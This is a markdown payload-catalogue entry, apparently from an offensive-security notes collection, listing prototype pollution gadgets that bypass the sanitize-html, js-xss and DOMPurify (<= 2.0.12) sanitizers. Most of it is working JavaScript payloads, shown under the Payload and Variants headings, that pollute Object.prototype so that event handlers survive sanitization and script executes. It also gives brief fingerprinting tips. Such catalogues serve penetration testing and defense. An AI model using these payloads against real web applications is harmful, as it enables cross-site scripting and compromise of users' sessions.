---
title: Prototype Pollution — Sanitizer Library Gadgets (sanitize-html, js-xss, DOMPurify)
slug: pp-sanitizer-gadgets
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/prototype-pollution, sink/sanitizer-bypass]
inbound: []
---

# Prototype Pollution — Sanitizer Library Gadgets (sanitize-html, js-xss, DOMPurify)

## Payload

```javascript
// sanitize-html — whiteList gadget
Object.prototype['*'] = ['onload']
document.write(sanitizeHtml('<iframe onload=alert(1)>'))
```

## Variants

```javascript
// js-xss filterXSS — whiteList gadget
Object.prototype.whiteList = {img: ['onerror', 'src']}
document.write(filterXSS('<img src onerror=alert(1)>'))

// DOMPurify (<= 2.0.12) — ALLOWED_ATTR gadget
Object.prototype.ALLOWED_ATTR = ['onerror', 'src']
document.write(DOMPurify.sanitize('<img src onerror=alert(1)>'))

// DOMPurify (<= 2.0.12) — documentMode gadget
Object.prototype.documentMode = 9
```

## Context

These gadgets bypass sanitization libraries by polluting the configuration objects they read internally. `sanitize-html` reads `whitelist['*']` for globally-allowed attributes — polluting it allows any event handler on any tag. `js-xss` reads `options.whiteList` for per-tag allowed attributes. DOMPurify ≤ 2.0.12 reads `config.ALLOWED_ATTR` and also checks `document.documentMode` (IE compatibility flag) to decide parse behavior. All require a PP source on the same page. Fingerprint: `typeof sanitizeHtml` / `typeof filterXSS` / `typeof DOMPurify`.

## Provenance

- Distilled from: `../../techniques/dom-xss/prototype-pollution-xss.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Prototype Pollution to XSS](../../techniques/dom-xss/prototype-pollution-xss.md)
